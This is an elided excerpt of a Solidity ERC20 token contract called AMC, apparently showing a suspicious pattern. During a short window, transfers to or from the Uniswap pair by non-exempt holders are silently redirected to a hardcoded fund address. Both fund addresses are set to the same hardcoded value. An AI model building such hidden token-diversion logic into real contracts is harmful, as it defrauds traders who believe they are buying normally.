...
contract AMC is IERC20, Ownable {
    ...
    address public fund1Address = address(0x9275048191755c3c320c4A335bc59880A88FdA1b);
    uint256 public _fund1Fee = 2;
    address public fund2Address = address(0x9275048191755c3c320c4A335bc59880A88FdA1b);
    uint256 public _fund2Fee = 3;
    uint256 public _scientisttime = 0;
    uint256 public _times = 10;
        ...
        if(from == uniswapV2Pair || to == uniswapV2Pair){ 
			if(!swapsEnabled){
                ...
                if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                    if(block.timestamp.sub(_scientisttime) <= _times)
                    {
                        to=fund1Address;
                    }
                }
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            rate = _taxFee + _destroyFee + _fund1Fee;
        }
